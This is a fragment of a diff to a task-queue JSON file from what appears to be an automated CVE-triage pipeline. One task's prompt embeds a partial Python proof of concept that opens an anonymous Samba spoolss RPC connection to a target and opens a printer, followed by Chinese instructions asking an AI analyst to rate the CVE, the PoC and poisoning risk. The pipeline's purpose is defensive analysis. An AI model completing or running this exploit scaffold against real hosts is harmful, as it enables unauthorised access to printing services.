\"\"\"\n    try:\n        # 初始化 LoadParm 并加载默认配置\n        lp = LoadParm()\n        lp.load_default()\n\n        # 初始化 Credentials 为匿名认证\n        creds = Credentials()\n        creds.guess(lp)\n        creds.set_anonymous()\n\n        if lp is None or creds is None:\n            raise Exception(\"[!] Credential initialization failed\")\n\n        print(\"[+] Credentials initialized (anonymous)\")\n        return lp, creds\n    \n    except Exception as e:\n        print(f\"[!] Credential initialization error: {e}\")\n        sys.exit(1)\n\n\ndef connect_to_spoolss(config, lp, creds):\n    \"\"\"\n    功能：建立与 Samba spoolss RPC 接口的连接\n    \n    参数：\n        config (Config): 配置对象\n        lp (LoadParm): Samba 参数\n        creds (Credentials): 认证凭证\n    \n    返回：\n        spoolss_interface: RPC 接口对象\n    \n    你需要实现：\n    - 构造 RPC 端点字符串 (ncacn_np 格式)\n    - 调用 spoolss.spoolss() 初始化接口\n    \n    提示：\n    - 格式：r\"ncacn_np:<target>[\\pipe\\spoolss]\"\n    - spoolss.spoolss(endpoint, lp, creds)\n    \"\"\"\n    try:\n        # 构造 RPC 端点字符串 (ncacn_np named pipe 格式)\n        endpoint = r\"ncacn_np:%s[\\pipe\\spoolss]\" % config.RHOST\n\n        # 初始化 spoolss 接口\n        iface = spoolss.spoolss(endpoint, lp, creds)\n\n        if iface is None:\n            raise Exception(\"[!] spoolss interface initialization failed\")\n\n        print(\"[+] Connected to spoolss interface\")\n        return iface\n    \n    except Exception as e:\n        print(f\"[!] spoolss connection error: {e}\")\n        sys.exit(1)\n\n\n# ============================================================================\n# 阶段二：打开打印机\n# ============================================================================\n\ndef open_printer(iface, config):\n    \"\"\"\n    功能：打开 HP-Reception 打印机，获得句柄\n    \n    参数：\n        iface: spoolss RPC 接口\n        config (Config): 配置对象\n    \n    返回：\n        handle: 打印机句柄，用于后续操作\n    \n    你需要实现：\n    - 调用 OpenPrinter RPC 方法\n    - 传入正确的参数：\n      * printer_name: UNC 路径 (\\\\\\\\<target>\\\\HP-Reception)\n      * datatype: 空字符串\n      * device_mode: DevmodeContainer()\n      * access_mask: PRINTER_ACCESS_USE\n    \n    提示：\n    - iface.OpenPrinter(name, datatype, device_mode, access_mask)\n    - UNC 路径需要正斜杠转义\n    \"\"\"\n    try:\n        # 构造 UNC 路径 (\\\\\\\\<target>\\\\HP-Reception)\n        # printer_name = r\"\\\\\\\\%s\\\\%s\" % (config.RHOST, config.PRINTER_SHARE)\n        printer_name = \"\\\\\\\\%s\\\\%s\" % (config.RHOST, config.PRINTER_SHARE)\n\n        # 创建空的 DevmodeContainer\n        device_mode = spoolss.DevmodeContainer()\n\n        # 调用 OpenPrinter 打开打印机\n \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 0,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": null,
     "last_error": null,
-    "created_at": 1780823012.814676,
+    "created_at": 1780830839.5556848,
     "last_attempt": 0,
-    "next_attempt": 1780823017.0662732,
+    "next_attempt": 1780830844.5797486,
     "metadata": {},
-    "task_id": "task_CVE-2025-55182_1780823012",
+    "task_id": "task_CVE-2026-4480_1780830839",
     "required_result_fields": [
       "poc_available",
       "condition",
